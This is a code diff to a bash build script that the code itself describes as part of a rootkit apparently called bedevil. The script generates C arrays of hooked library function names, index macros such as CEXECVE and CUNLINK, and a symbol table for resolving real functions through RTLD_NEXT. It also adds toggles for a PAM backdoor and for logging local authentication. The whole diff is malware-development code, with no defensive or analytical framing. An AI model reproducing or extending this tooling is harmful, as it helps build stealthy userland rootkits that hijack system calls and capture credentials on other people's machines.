@@ -24,12 +24,6 @@ get_hooks(){ # $1 = arrays file path
         array_name="`get_arrayname "$line"`"
         array_elements="`get_arrayelems "$line"`"
 
-        # skip, if:
-        # a: array's toggle is disabled
-        # b: array is not an array of function names
-        [ "$array_elements" == "(skip)" ] || \
-        [[ $array_name != *"_calls"* ]] && continue
-
         # parse function names (array_elements) and add them to 'hooks'.
         # this array is later written to bedevil.h.
         IFS=',' read -a split_array_elements <<< "$array_elements"
@@ -37,26 +31,6 @@ get_hooks(){ # $1 = arrays file path
     done <<< "$contents"
 
     echo -n "${hooks[*]}"
-}
-
-find_char_arrays(){
-    local arrays_locations header_dirs
-    header_dirs=(`get_header_dirs`)
-
-    for dir in ${header_dirs[@]}; do
-        # for every header include's directory, look for an 'arrays' file
-        # within it.
-        local arrays_path=$dir/arrays
-        [ ! -f $arrays_path ] && continue
-
-        # if the path of the current 'arrays' file has already been added,
-        # don't add it again.
-        [[ "${arrays_locations[*]}" == *"$arrays_path"* ]] && continue
-
-        arrays_locations+=($arrays_path)  # got an 'arrays' file, add it to our list.
-    done
-
-    echo -n "${arrays_locations[*]}"
 }
 
 # build a C array for writing to a header and echo it out.
@@ -83,11 +57,9 @@ build_array(){
     echo -n "${carr::${#carr}-1}};\n"
 }
 
-# using this & by looping through every 'arrays' file found
-# by `find_char_arrays`, build C arrays for every array
-# defined within the current file.
-buildall_char_arrays(){ # $1 = arrays file path
-    local contents char_arrays location \
+# build C arrays for every array defined within the current file.
+buildall_arrays(){ # $1 = target file path
+    local contents arrays location \
           array_name array_elements
 
     # fetch the current 'arrays' path and read it.
@@ -98,6 +70,10 @@ buildall_char_arrays(){ # $1 = arrays file path
     # build a C array for it.
     while read -r line; do
         array_name="`get_arrayname "$line"`"
+        [ $array_name == "libpam_calls" ] && { \
+            [ "`toggle_enabled USE_PAM_BD`" == "false" ] && \
+                [ "`toggle_enabled LOG_LOCAL_AUTH`" == "false" ] && continue; \
+        }
         array_elements="`get_arrayelems "$line"`"
 
         # skip building the current array in the current 'arrays' file
@@ -107,48 +83,47 @@ buildall_char_arrays(){ # $1 = arrays file path
         # sort elements into a list and build our char array.
         # append it onto the final string.
         IFS=',' read -a split_array_elements <<< "$array_elements"
-        char_arrays+="`build_array "$array_name" \
-                                   "${split_array_elements[*]}" \
-                                    ${#split_array_elements[*]}`"
+        arrays+="`build_array "$array_name" \
+                              "${split_array_elements[*]}" \
+                              ${#split_array_elements[*]}`"
     done <<< "$contents"
 
     # done parsing file & building respective arrays.
     # show me the $$$
-    echo -n "$char_arrays"
+    echo -n "$arrays"
 }
 
-write_char_arrays(){
-    local char_arrays locations hooks
+write_hooks(){
+    local arrays location hooks
 
-    # get all 'arrays' file paths
-    locations=(`find_char_arrays`)
+    # location of hooks file
+    location=inc/hooks/libdl/hooks
 
-    for location in ${locations[@]}; do
-        # for the current 'arrays' path, build the C arrays that are
-        # defined within it.
-        char_arrays+="`buildall_char_arrays $location`"
+    # build the arrays for the hooked function names of individual libs
+    arrays+="`buildall_arrays $location`"
 
-        # in case there are function names within an array to be built,
-        # check the 'arrays' file and add any possible function names
-        # to the 'hooks' array here.
-        hooks+=(`get_hooks $location`)
+    # after we've built the function name arrays for individual libs,
+    # we want to add ALL of the function names to a list.
+    hooks+=(`get_hooks $location`)
+
+    # build a new array for all of the function names in '${hooks[*]}'.
+    # this is utilized by '_hook()' in libdl/gsym.c & its subsequent
+    # functions & macro wrappers.
+    arrays+="`build_array "all" "${hooks[*]}" ${#hooks[*]}`"
+
+    # define index references for all of the function names that we got.
+    # these index references are for use with 'hook()' etc...
+    # i.e.: hook(CFOPEN, CEXECVE, CUNLINK);
+    for i in "${!hooks[@]}"; do
+        arrays+="#define C`echo ${hooks[i]} | awk '{print toupper($0)}'` $i\n"
     done
 
-    # regarding any hooks that were added just above when reading the 'arrays'
-    # files, build a C array for all of them and call it 'all'. this is utilized
-    # by the libdl hooks and other similar symbol-resolving functions within the rootkit.
-    char_arrays+="`build_array "all" "${hooks[*]}" ${#hooks[*]}`"
-
-    # define index references for all of the hooks within the 'all' array.
-    # this is of utmost importance, as this is how we resolve symbols in the rootkit,
-    # via the hook(INDEX) macro.
-    for i in "${!hooks[@]}"; do char_arrays+="#define C`echo ${hooks[i]} | awk '{print toupper($0)}'` $i\n"; done
-
     # finally, define our struct array of function pointers for our resolved
-    # symbols to live. after using hook(INDEX), using call(INDEX, ...) references
-    # symbols[INDEX].func(...)
-    char_arrays+="syms symbols[ALL_SIZE];\n"
+    # symbols to live.
+    # hook(INDEX1, INDEX2, INDEX3) calls _hook(RTLD_NEXT, INDEX1, INDEX2, INDEX3),
+    # call(INDEX, ...) references symbols[INDEX].func(...)
+    arrays+="syms symbols[ALL_SIZE];\n"
 
     # all done. we should be good to go.
-    printf "\n$char_arrays"
+    printf "\n$arrays"
 }
